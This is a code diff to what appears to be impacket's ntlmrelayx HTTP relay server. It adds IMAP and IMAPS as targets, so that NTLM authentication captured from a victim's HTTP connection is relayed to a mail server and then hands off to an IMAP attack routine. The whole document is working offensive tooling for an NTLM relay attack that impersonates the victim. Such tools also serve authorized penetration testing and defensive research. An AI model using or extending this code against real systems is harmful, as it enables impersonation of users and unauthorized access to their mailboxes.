@@ -24,7 +24,7 @@ import string
 from threading import Thread
 
 from impacket import ntlm
-from impacket.examples.ntlmrelayx.clients import SMBRelayClient, MSSQLRelayClient, LDAPRelayClient, HTTPRelayClient
+from impacket.examples.ntlmrelayx.clients import SMBRelayClient, MSSQLRelayClient, LDAPRelayClient, HTTPRelayClient, IMAPRelayClient
 from impacket.spnego import SPNEGO_NegTokenResp
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
 from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
@@ -200,6 +200,17 @@ class HTTPRelayServer(Thread):
                     logging.error(str(e))
                     return False
 
+            if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
+                try:
+                    self.client = IMAPRelayClient("%s://%s:%d" % (self.target[0].lower(),self.target[1],self.target[2]))
+                    negotiate = ntlm.NTLMAuthNegotiate()
+                    negotiate.fromString(token)
+                    clientChallengeMessage = self.client.sendNegotiate(negotiate.getData())
+                except Exception, e:
+                    logging.error("Connection against target %s FAILED" % self.target[1])
+                    logging.error(str(e))
+                    return False
+
             #Calculate auth
             self.challengeMessage = ntlm.NTLMAuthChallenge()
             self.challengeMessage.fromString(clientChallengeMessage)
@@ -252,7 +263,20 @@ class HTTPRelayServer(Thread):
                             logging.error("HTTP NTLM auth against %s as %s FAILED" % (self.target[1],self.authUser))
                             return False
                     except Exception, e:
-                        logging.error("NTLM Message type 3 against %s FAILED" % self.target[1])
+                        logging.error("HTTP NTLM Message type 3 against %s FAILED" % self.target[1])
+                        logging.error(str(e))
+                        return False
+
+                if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
+                    try:
+                        result = self.client.sendAuth(token) #Result is a boolean
+                        if result:
+                            return True
+                        else:
+                            logging.error("IMAP NTLM auth against %s as %s FAILED" % (self.target[1],self.authUser))
+                            return False
+                    except Exception, e:
+                        logging.error("IMAP NTLM Message type 3 against %s FAILED" % self.target[1])
                         logging.error(str(e))
                         return False
             else:
@@ -276,6 +300,9 @@ class HTTPRelayServer(Thread):
                 clientThread.start()
             if self.target[0] == 'MSSQL':
                 clientThread = self.server.config.attacks['MSSQL'](self.server.config, self.client)
+                clientThread.start()
+            if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
+                clientThread = self.server.config.attacks['IMAP'](self.server.config, self.client, self.authUser)
                 clientThread.start()
 
     def __init__(self, config):
